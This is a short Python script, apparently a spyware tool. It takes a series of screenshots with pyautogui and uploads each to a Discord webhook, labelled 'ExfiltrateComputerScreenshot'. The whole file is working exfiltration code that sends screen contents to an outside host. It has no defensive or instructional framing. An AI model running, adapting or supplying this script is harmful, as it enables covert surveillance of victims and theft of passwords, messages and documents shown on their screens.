import pyautogui
from time import sleep
import requests


# YOUR DISCORD WEBHOOK
discord_webhook = "https://discord.com/api/webhooks/123456789/xxxxxxxxxx"

# Edit this variables as you want
SCREENSHOTS = 10
TIMING = 5

for i in range(SCREENSHOTS):
    sleep(TIMING)

    # take the screenshot
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")

    with open("screenshot.png", "rb") as f:
        foto = f.read()

    richiesta = {
        "username": "ExfiltrateComputerScreenshot"
    }

    # Send the message by attaching the photo
    response = requests.post(discord_webhook, data=richiesta, files={"Screen#"+str(i)+".png": foto})

    # Useful for debugging
    # if response.status_code == 200:
    #     print("Photo successfully sent!")
    # else:
    #     print("Error while submitting photo." + str(response.status_code))